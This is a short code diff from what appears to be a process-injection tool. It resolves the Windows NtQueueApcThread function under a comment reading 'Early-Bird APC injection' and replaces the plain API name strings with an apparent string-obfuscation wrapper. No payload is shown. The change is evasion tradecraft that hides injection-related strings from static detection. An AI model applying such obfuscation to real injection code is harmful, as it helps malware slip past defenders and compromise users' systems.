@@ -5,7 +5,7 @@ typedef NTSTATUS(NTAPI* pNtQueueApcThread)(HANDLE,PVOID,PVOID,PVOID,PVOID);
 
 static pNtQueueApcThread GetNtQueueApc() {
     return (pNtQueueApcThread)GetProcAddress(
-        GetModuleHandleA("ntdll.dll"), "NtQueueApcThread");
+        GetModuleHandleA(S("ntdll.dll").c_str()), S("NtQueueApcThread").c_str());
 }
 
 // ── Early-Bird APC injection ──────────────────────────────────────────────────
